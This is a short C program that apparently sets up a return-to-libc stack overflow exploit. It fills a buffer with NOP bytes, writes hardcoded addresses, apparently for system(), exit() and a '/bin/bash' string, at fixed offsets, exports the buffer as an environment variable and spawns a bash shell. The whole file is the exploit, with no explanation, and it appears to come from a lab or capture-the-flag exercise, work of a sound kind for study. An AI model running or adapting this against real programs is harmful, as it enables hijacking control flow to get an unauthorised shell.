#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char sysAddr[]="\x90\x33\xa5\xf7\xff\x7f";
char exitAddr[]="\x30\x80\xa4\xf7\xff\x7f";
char bashAddr[]="\xfd\xe7\xff\xff\xff\x7f";

int main(){
	char buf[104];

	memset(buf,0x90,104);
	memcpy(buf,"BUF=",4);
	memcpy(buf+88,sysAddr,4);
	memcpy(buf+92,exitAddr,4);
	memcpy(buf+96,bashAddr,4);
	memcpy(buf+100,"\x00\x00\x00\x00\x00\x00",4);

	putenv(buf);
	system("/bin/bash");

	return 1;
}
